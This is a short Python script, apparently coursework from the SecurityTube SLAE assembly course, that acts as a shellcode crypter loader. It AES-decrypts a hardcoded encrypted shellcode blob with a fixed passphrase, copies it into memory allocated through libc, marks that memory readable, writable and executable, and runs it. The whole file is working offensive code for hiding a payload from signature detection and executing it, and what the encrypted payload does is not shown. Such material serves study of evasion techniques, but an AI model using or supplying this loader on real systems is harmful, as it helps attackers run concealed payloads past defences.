#!/usr/bin/env python 
from base64 import b64encode
import simple_aes_cipher
from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE

pass_phrase = "security-tube-slae1483"
secret_key = simple_aes_cipher.generate_secret_key(pass_phrase)
cipher = simple_aes_cipher.AESCipher(secret_key)

encrypted_shellcode = "\x40\x99\x24\x40\x0b\x22\xa0\x33\xdb\x89\x31\xbd\xd9\x1b\x9f\xfb\x90\xe4\xd0\xb2\x9d\xf8\xc1\x7b\x17\x99\x34\xe4\x03\x4a\x5b\x2d\x71\x9e\x6a\x60\x68\x03\xcb\xd7\x07\x80\x7d\x38\xc9\x57\xce\x62"
decrypt_text = cipher.decrypt(b64encode(encrypted_shellcode))

libc = CDLL('libc.so.6')

sc = c_char_p(decrypt_text)
size = len(decrypt_text)
addr = c_void_p(libc.valloc(size))
memmove(addr, sc, size)
libc.mprotect(addr, size, 0x7)
run = cast(addr, CFUNCTYPE(c_void_p))
run()
